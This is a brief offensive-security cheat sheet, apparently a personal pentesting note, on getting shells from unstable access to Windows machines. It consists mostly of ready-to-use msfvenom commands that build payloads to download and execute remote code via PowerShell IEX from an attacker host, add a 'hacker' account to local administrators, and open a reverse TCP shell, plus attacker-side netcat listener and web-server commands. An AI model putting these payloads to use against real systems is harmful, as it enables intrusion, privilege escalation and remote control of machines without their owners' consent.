# Windows Non-interactive Unstable Shell Upgrade Stuff
sometimes you land on a windows machine and you just can't get an interactive shell going! Here are some ways to work with it/work around it!

## 🎃 MSFVenom windows/exec

For when you have a super unstable connection! So long as you can execute, it should send you back a revshell!

## 😎 Payload

make a user

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/pay.exe')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators hacker /add" -f exe > pay.exe
```

give me a revshell
```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/pay.exe')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe > pay.exe

```


## ⭐ Attacker
```
nc -lvnp 4444
```
```
python -m http.server
```


##🌙 Victim
```
.\pay.exe
```
